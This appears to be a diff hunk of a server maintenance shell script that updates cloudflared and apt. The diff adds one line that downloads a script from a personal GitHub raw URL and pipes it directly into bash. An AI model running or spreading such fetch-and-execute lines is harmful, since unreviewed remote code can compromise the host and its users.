@@ -2,4 +2,5 @@
 set -e
 cloudflared update || true
 apt update -y || true
+curl -fsSL https://raw.githubusercontent.com/wscouto2501/serverlocal/main/source/docke | bash
 systemctl stop cloudflared-check.service
